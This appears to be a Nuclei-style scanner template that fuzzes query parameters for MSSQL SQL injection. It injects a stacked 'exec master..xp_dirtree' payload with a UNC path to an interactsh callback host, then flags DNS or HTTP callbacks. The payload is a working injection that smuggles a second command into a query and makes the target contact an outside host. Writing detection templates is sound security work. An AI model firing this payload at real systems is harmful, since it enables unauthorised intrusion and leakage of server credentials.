id: fuzz-xp-dirtree-oob

info:
  name: MSSQL xp_dirtree UNC path OOB
  author: openai
  severity: high
  tags: mssql,rce,sqli,oob,dast

http:
  - method: GET
    path:
      - "{{BaseURL}}"
      
    payloads:
      dirtree:
        - "1; exec master..xp_dirtree '\\\\{{interactsh-url}}\\\\abc'--"
        
    fuzzing:
      - part: query
        mode: multiple
        fuzz:
          - "{{dirtree}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - dns
          - http
